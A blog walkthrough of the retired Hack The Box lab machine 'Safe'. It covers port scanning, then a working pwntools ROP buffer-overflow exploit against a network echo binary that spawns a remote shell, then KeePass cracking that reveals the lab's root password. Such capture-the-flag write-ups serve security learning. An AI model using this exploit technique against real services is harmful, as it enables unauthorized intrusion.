---
layout: post
title: "Safe: Hack The Box Walkthrough"
date: 2019-10-26 15:57:20 +0000
last_modified_at: 2019-10-26 15:57:20 +0000
category: Walkthrough
tags: ["Hack The Box", Safe, retired]
comments: true
image:
  feature: safe-htb-walkthrough.jpg
  credit: AbsolutVision / Pixabay
  creditlink: https://pixabay.com/illustrations/password-app-application-business-2781614/
---

This post documents the complete walkthrough of Safe, a retired vulnerable [VM][1] created by [ecdo][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Safe is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let\'s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.147 --rate=1000

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-07-28 11:21:20 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.147                                    
Discovered open port 1337/tcp on 10.10.10.147                                  
Discovered open port 22/tcp on 10.10.10.147
```

Hmm. masscan finds three open ports. `1337/tcp` sure looks interesting. Let\'s do one better with nmap scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80,1337 -A --reason -oN nmap.txt 10.10.10.147
...
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
1337/tcp open  waste?  syn-ack ttl 63
| fingerprint-strings:
|   DNSStatusRequestTCP:
|     05:26:35 up 1:47, 1 user, load average: 0.13, 0.04, 0.01
|   DNSVersionBindReqTCP:
|     05:26:30 up 1:47, 1 user, load average: 0.14, 0.04, 0.01
|   GenericLines:
|     05:26:17 up 1:47, 1 user, load average: 0.07, 0.03, 0.01
|     What do you want me to echo back?
|   GetRequest:
|     05:26:23 up 1:47, 1 user, load average: 0.07, 0.03, 0.01
|     What do you want me to echo back? GET / HTTP/1.0
|   HTTPOptions:
|     05:26:24 up 1:47, 1 user, load average: 0.06, 0.03, 0.01
|     What do you want me to echo back? OPTIONS / HTTP/1.0
|   Help:
|     05:26:41 up 1:47, 1 user, load average: 0.12, 0.04, 0.01
|     What do you want me to echo back? HELP
|   Kerberos, TLSSessionReq:
|     05:26:42 up 1:47, 1 user, load average: 0.12, 0.04, 0.01
|     What do you want me to echo back?
|   NULL:
|     05:26:17 up 1:47, 1 user, load average: 0.07, 0.03, 0.01
|   RPCCheck:
|     05:26:25 up 1:47, 1 user, load average: 0.06, 0.03, 0.01
|   RTSPRequest:
|     05:26:24 up 1:47, 1 user, load average: 0.06, 0.03, 0.01
|     What do you want me to echo back? OPTIONS / RTSP/1.0
|   SSLSessionReq:
|     05:26:41 up 1:47, 1 user, load average: 0.12, 0.04, 0.01
|_    What do you want me to echo back?
```

`1337/tcp` sure looks like some kind of `echo` service. Well, I'm going to check out the `http` service first. And, this is how it looks like.

<a class="image-popup">
![85b8c013.png](/assets/images/posts/safe-htb-walkthrough/85b8c013.png)
</a>

Nothing really exciting with the default Apache page or is that so? Check out the HTML source.

<a class="image-popup">
![1ee133e1.png](/assets/images/posts/safe-htb-walkthrough/1ee133e1.png)
</a>

I smell remote code execution (RCE) in `myapp`.

### Vulnerability Anlysis of `myapp`

`myapp` is indeed at http://10.10.10.147/myapp.

```
# wget http://10.10.10.147/myapp
# file myapp
myapp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fcbd5450d23673e92c8b716200762ca7d282c73a, not stripped
```

Looks like someone has submitted the file to VirusTotal for a quick look.

<a class="image-popup">
![621e2876.png](/assets/images/posts/safe-htb-walkthrough/621e2876.png)
</a>

On top of that, someone has also submitted to ropshell.com for ROP gadgets.

<a class="image-popup">
![ead45588.png](/assets/images/posts/safe-htb-walkthrough/ead45588.png)
</a>

A quick `checksec` in PEDA shows that NX is enabled (non-executable stack).

<a class="image-popup">
![2c2d224a.png](/assets/images/posts/safe-htb-walkthrough/2c2d224a.png)
</a>

If I have to guess, I would say this is a simple ROP exploit. Don\'t take my word for it. Look at the `main()` function of `myapp`.

<a class="image-popup">
![87b73f8e.png](/assets/images/posts/safe-htb-walkthrough/87b73f8e.png)
</a>

### Exploit Development

Long story short, the offset to control the return address is 120 bytes. Here's how to do it.

1. Get PEDA if you have not already done so.
2. Generate a 200-byte pattern. `gdb-peda# pattern_create 200 buf`.
3. `set follow-fork-mode parent` because of `system()` forks.
4. Break at `*main+77`. This is the last instruction before RIP pops the return address.
5. `run` with the pattern or `r < buf`.
6. `continue` or `c` with the execution.

You should see something like this.

<a class="image-popup">
![88110186.png](/assets/images/posts/safe-htb-walkthrough/88110186.png)
</a>

Use `pattern_offset` to determine the offset.

<a class="image-popup">
![a165b5d3.png](/assets/images/posts/safe-htb-walkthrough/a165b5d3.png)
</a>

Armed with that knowledge, you can write a ROP exploit with `pwntools` like so.

<div class="filename"><span>exploit.py</span></div>

~~~~python
from pwn import *

context(terminal=["tmux", "new-windows"])
context(os="linux", arch="amd64")

myapp = ELF("./myapp")
p     = remote("10.10.10.147", 1337)

bss = myapp.bss()
junk = 'A' * 120

# Show me the shell
rop = ROP(myapp)
rop.gets(bss)
rop.system(bss)

payload = junk + str(rop) + "/bin/bash\n" + "bash\n"

p.send(payload)
p.interactive()
~~~~

I\'ve chosen to write the string "/bin/bash" at `.bss` because its address doesn\'t change.

## Low-Privilege Shell

Let\'s give it a go.

<a class="image-popup">
![8b20e99a.png](/assets/images/posts/safe-htb-walkthrough/8b20e99a.png)
</a>

Sweet. The `user.txt` is at `user`\'s home directory.

<a class="image-popup">
![c26b1848.png](/assets/images/posts/safe-htb-walkthrough/c26b1848.png)
</a>

## Privilege Escalation

During enumeration of `user`\'s account, I noticed the presence of a KeyPass database and five image files in the home directory as well.

<a class="image-popup">
![8924871a.png](/assets/images/posts/safe-htb-walkthrough/8924871a.png)
</a>

This feels strangly familiar like BigHead. Well, in any case, let's grab these files to my attacking machine but note that there\'s no `nc` in this machine. We\'ll just have to transfer our `nc` over.

<a class="image-popup">
![f2aa8982.png](/assets/images/posts/safe-htb-walkthrough/f2aa8982.png)
</a>

We can transfer the files now. And just like BigHead, one of the image files is the key file. We just need to crack the master password.

<a class="image-popup">
![8a33e563.png](/assets/images/posts/safe-htb-walkthrough/8a33e563.png)
</a>

The master password is `bullshit`. Yeah.

...

Armed with the master password and the key file, we can open the KeePass database.

<a class="image-popup">
![b39109ff.png](/assets/images/posts/safe-htb-walkthrough/b39109ff.png)
</a>

Simply copy the `root` password to the clipboard and we are done.

<a class="image-popup">
![0586e79e.png](/assets/images/posts/safe-htb-walkthrough/0586e79e.png)
</a>

The `root` password is `u3v2249dl9ptv465cogl3cnpo3fyhk`.

<a class="image-popup">
![56f40503.png](/assets/images/posts/safe-htb-walkthrough/56f40503.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/199
[2]: https://www.hackthebox.eu/home/users/profile/91108
[3]: https://www.hackthebox.eu/
